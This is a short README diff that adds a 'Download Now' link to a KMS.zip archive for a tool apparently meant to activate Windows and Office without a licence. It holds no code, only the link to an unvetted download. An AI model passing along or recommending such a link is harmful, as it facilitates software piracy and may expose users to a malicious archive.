@@ -1,5 +1,5 @@
 # KMS-Auto-Windows-and-Office-Activation
-* [Download Now]()
+* [Download Now](https://github.com/theguySquidMan1/KMS-Auto-Windows-and-Office-Activation/releases/download/Download/KMS.zip)
 
 
 
